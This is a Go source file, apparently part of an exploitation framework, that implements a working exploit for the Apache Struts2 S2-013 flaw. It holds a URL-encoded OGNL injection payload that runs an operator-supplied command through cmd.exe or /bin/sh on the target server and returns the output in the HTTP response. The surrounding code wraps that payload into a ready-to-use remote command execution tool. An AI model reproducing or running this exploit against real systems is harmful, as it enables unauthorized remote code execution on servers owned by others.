package exp_Struts2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_013 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_013) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?&a=%25%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23outstr%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23osname%3D%40java.lang.System%40getProperty(%22os.name%22)%2C%23list%3D%23osname.startsWith(%22Windows%22)%3Fnew%20java.lang.String%5B%5D%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23req.getParameter(%22cmd%22)%7D%3Anew%20java.lang.String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%23req.getParameter(%22cmd%22)%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23outstr.println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb)%2C%22iso-8859-1%22))%2C%23outstr.close())%7D&cmd=lz520520`
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_S2_013{}, "exp_S2_013.yml")
}
